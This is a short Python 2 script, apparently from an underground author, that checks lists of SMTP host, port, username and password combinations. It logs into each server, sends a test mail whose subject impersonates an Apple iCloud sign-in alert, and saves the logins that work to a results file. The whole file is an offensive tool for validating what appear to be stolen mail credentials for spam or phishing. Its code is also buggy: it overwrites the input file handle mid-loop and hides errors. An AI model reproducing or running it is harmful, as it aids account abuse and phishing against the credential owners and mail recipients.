# Create By Deadrz_404
# CHECKER SMTP

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

# Smtp tester

list = raw_input("Masukin list  : ")
mailto =  raw_input("Masukan emailtujuan : ")
op = open(list)
for line in op:
	try:
		line = line.rstrip()
		host, port, user, passw = line.split('|')
		print host
		msg = MIMEMultipart()
		message = "host : "+host+"\nport : "+port+"\nUser : "+user+"\npass : "+passw
        # Header mail
		msg['From'] = "Info@"+user
		msg['To'] = mailto
		msg['Subject'] = "Your Apple ID was used to sign in to iCloud via a web browser"

		# body mail
		msg.attach(MIMEText(message, 'plain'))
		# serve library smtplib
		server = smtplib.SMTP(host,port)
		# login credentials
		server.login(user, passw)
		# kirim email via server.
		server.sendmail(msg['From'], msg['To'], msg.as_string())
		server.quit()
		print("\nSent to using : "+host+"|"+port+"|"+user+"|"+passw+"\n")
		print "Successfully sent email to %s " % (msg['To'])
		op = open("rsult.txt","a+")
		op.write(host+"|"+port+"|"+user+"|"+passw+"\n")
		op.close(op)
	except:
		continue